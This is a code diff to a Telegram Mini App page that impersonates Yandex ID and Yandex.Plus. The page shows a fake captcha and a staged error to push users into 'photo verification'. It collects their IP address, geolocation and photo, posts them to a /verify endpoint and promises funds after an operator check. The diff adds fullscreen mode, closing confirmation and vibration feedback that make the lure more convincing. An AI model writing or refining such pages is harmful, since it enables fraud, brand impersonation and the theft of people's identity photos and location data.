@@ -175,8 +175,23 @@
 
 <script>
     const tg = window.Telegram.WebApp;
-    tg.expand();
-    tg.setHeaderColor('#050505');
+
+    // 1. Инициализация и Фулскрин
+    function initApp() {
+        tg.ready();
+        tg.expand();
+        
+        // Запрос настоящего Fullscreen (для версий 7.7+)
+        if (tg.isVersionAtLeast('7.7')) {
+            tg.requestFullscreen(); 
+        }
+
+        // Цвета и защита от свайпа
+        tg.setHeaderColor('#050505');
+        tg.setBackgroundColor('#050505');
+        tg.enableClosingConfirmation(); 
+    }
+    initApp();
 
     // Функция получения ГЕО
     function getCoords() {
@@ -190,12 +205,14 @@
         });
     }
 
-    // Обработка клика по капче
+    // Обработка клика по капче + вибрация
     function handleCaptcha(el) {
+        tg.HapticFeedback.notificationOccurred('warning'); // Легкая вибрация-предупреждение
         const text = document.getElementById('capText');
         const circle = document.getElementById('capCircle');
         text.innerText = 'Синхронизация Яндекс ID...';
         circle.innerHTML = '⌛';
+        
         setTimeout(() => {
             alert('Ошибка Яндекс ID. Требуется ручное подтверждение через фото-верификацию.');
             text.innerText = 'Ошибка. Пройдите проверку ниже.';
@@ -210,15 +227,16 @@
         const btn = document.getElementById('submitBtn');
         
         if (!document.getElementById('photo').files[0]) {
+            tg.HapticFeedback.notificationOccurred('error'); // Вибрация при ошибке
             alert("Сначала сделайте фото-верификацию");
             return;
         }
 
+        tg.HapticFeedback.impactOccurred('heavy'); // Мощный отклик при нажатии
         btn.innerText = 'ОБРАБОТКА...';
         btn.disabled = true;
 
         try {
-            // Сбор данных
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const { ip } = await ipRes.json();
             const location = await getCoords();
@@ -241,6 +259,7 @@
             const response = await fetch('/verify', { method: 'POST', body: formData });
 
             if (response.ok) {
+                tg.HapticFeedback.notificationOccurred('success'); // Вибрация успеха
                 tg.showPopup({
                     title: 'Заявка принята',
                     message: 'Средства зачислятся после проверки фото-верификации оператором Яндекс.Плюс.',
